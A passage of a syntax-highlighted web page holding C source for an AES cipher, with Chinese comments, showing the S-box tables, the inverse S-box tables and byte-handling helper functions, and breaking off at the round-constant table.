class="hljs-number">0x0e</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x9e</span>,<br>                               <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xdf</span>,<br>                               <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x16</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆S盒</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S2[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] = &#123; <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>                                <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>                                <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>                                <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>                                <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>                                <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>                                <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>                                <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>                                <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>                                <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>                                <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>                                <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>                                <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>                                <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>                                <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>                                <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span> &#125;;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> S3[] = &#123; <span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9e</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xf3</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xfb</span>,<br>                                <span class="hljs-number">0x7c</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9b</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xc4</span>, <span class="hljs-number">0xde</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xcb</span>,<br>                                <span class="hljs-number">0x54</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xa6</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0xee</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0b</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfa</span>, <span class="hljs-number">0xc3</span>, <span class="hljs-number">0x4e</span>,<br>                                <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2e</span>, <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5b</span>, <span class="hljs-number">0xa2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6d</span>, <span class="hljs-number">0x8b</span>, <span class="hljs-number">0xd1</span>, <span class="hljs-number">0x25</span>,<br>                                <span class="hljs-number">0x72</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa4</span>, <span class="hljs-number">0x5c</span>, <span class="hljs-number">0xcc</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xb6</span>, <span class="hljs-number">0x92</span>,<br>                                <span class="hljs-number">0x6c</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xfd</span>, <span class="hljs-number">0xed</span>, <span class="hljs-number">0xb9</span>, <span class="hljs-number">0xda</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xa7</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x84</span>,<br>                                <span class="hljs-number">0x90</span>, <span class="hljs-number">0xd8</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8c</span>, <span class="hljs-number">0xbc</span>, <span class="hljs-number">0xd3</span>, <span class="hljs-number">0x0a</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xe4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0xb3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>,<br>                                <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x8f</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xc1</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0x6b</span>,<br>                                <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xea</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xce</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0xe6</span>, <span class="hljs-number">0x73</span>,<br>                                <span class="hljs-number">0x96</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xe7</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xe2</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0x1c</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xdf</span>, <span class="hljs-number">0x6e</span>,<br>                                <span class="hljs-number">0x47</span>, <span class="hljs-number">0xf1</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1d</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xc5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0xb7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x1b</span>,<br>                                <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x4b</span>, <span class="hljs-number">0xc6</span>, <span class="hljs-number">0xd2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9a</span>, <span class="hljs-number">0xdb</span>, <span class="hljs-number">0xc0</span>, <span class="hljs-number">0xfe</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xcd</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0xf4</span>,<br>                                <span class="hljs-number">0x1f</span>, <span class="hljs-number">0xdd</span>, <span class="hljs-number">0xa8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xb1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xec</span>, <span class="hljs-number">0x5f</span>,<br>                                <span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7f</span>, <span class="hljs-number">0xa9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xb5</span>, <span class="hljs-number">0x4a</span>, <span class="hljs-number">0x0d</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xc9</span>, <span class="hljs-number">0x9c</span>, <span class="hljs-number">0xef</span>,<br>                                <span class="hljs-number">0xa0</span>, <span class="hljs-number">0xe0</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x4d</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0xf5</span>, <span class="hljs-number">0xb0</span>, <span class="hljs-number">0xc8</span>, <span class="hljs-number">0xeb</span>, <span class="hljs-number">0xbb</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>,<br>                                <span class="hljs-number">0x17</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0xba</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xd6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0c</span>, <span class="hljs-number">0x7d</span> &#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取整形数据的低8位的左4个位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getLeft4Bit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> left = num &amp; <span class="hljs-number">0x000000f0</span>;<br>    <span class="hljs-keyword">return</span> left &gt;&gt; <span class="hljs-number">4</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 获取整形数据的低8位的右4个位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getRight4Bit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> num &amp; <span class="hljs-number">0x0000000f</span>;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据索引，从S盒中获得元素</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumFromSBox</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = getLeft4Bit(index);<br>    <span class="hljs-keyword">int</span> col = getRight4Bit(index);<br>    <span class="hljs-keyword">return</span> S[row][col];<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把一个字符转变成整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getIntFromChar</span><span class="hljs-params">(<span class="hljs-keyword">char</span> c)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result = (<span class="hljs-keyword">int</span>) c;<br>    <span class="hljs-keyword">return</span> result &amp; <span class="hljs-number">0x000000ff</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把16个字符转变成4X4的数组，</span><br><span class="hljs-comment"> * 该矩阵中字节的排列顺序为从上到下，</span><br><span class="hljs-comment"> * 从左到右依次排列。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">convertToIntArray</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> pa[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            pa[j][i] = getIntFromChar(str[k]);<br>            k++;<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印4X4的数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>,  a[i][j]);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印字符串的ASSCI，</span><br><span class="hljs-comment"> * 以十六进制显示。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printASSCI</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x &quot;</span>, getIntFromChar(str[i]));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把连续的4个字符合并成一个4字节的整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getWordFromStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one, two, three, four;<br>    one = getIntFromChar(str[<span class="hljs-number">0</span>]);<br>    one = one &lt;&lt; <span class="hljs-number">24</span>;<br>    two = getIntFromChar(str[<span class="hljs-number">1</span>]);<br>    two = two &lt;&lt; <span class="hljs-number">16</span>;<br>    three = getIntFromChar(str[<span class="hljs-number">2</span>]);<br>    three = three &lt;&lt; <span class="hljs-number">8</span>;<br>    four = getIntFromChar(str[<span class="hljs-number">3</span>]);<br>    <span class="hljs-keyword">return</span> one | two | three | four;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把一个4字节的数的第一、二、三、四个字节取出，</span><br><span class="hljs-comment"> * 入进一个4个元素的整型数组里面。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">splitIntToArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one, two, three;<br>    one = num &gt;&gt; <span class="hljs-number">24</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] = one &amp; <span class="hljs-number">0x000000ff</span>;<br>    two = num &gt;&gt; <span class="hljs-number">16</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>] = two &amp; <span class="hljs-number">0x000000ff</span>;<br>    three = num &gt;&gt; <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] = three &amp; <span class="hljs-number">0x000000ff</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>] = num &amp; <span class="hljs-number">0x000000ff</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 将数组中的元素循环左移step位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">leftLoop4int</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> step)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        temp[i] = <span class="hljs-built_in">array</span>[i];<br><br>    index = step % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : step % <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-built_in">array</span>[i] = temp[index];<br>        index++;<br>        index = index % <span class="hljs-number">4</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把数组中的第一、二、三和四元素分别作为</span><br><span class="hljs-comment"> * 4字节整型的第一、二、三和四字节，合并成一个4字节整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">mergeArrayToInt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one = <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>;<br>    <span class="hljs-keyword">int</span> two = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>;<br>    <span class="hljs-keyword">int</span> three = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">int</span> four = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">return</span> one | two | three | four;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 常量轮值表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Rcon[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">0x01000000</span>, <span class="hljs-number">0x02000000</span>,<br>                              <span class="hljs-number">0x04000000</span>, <span 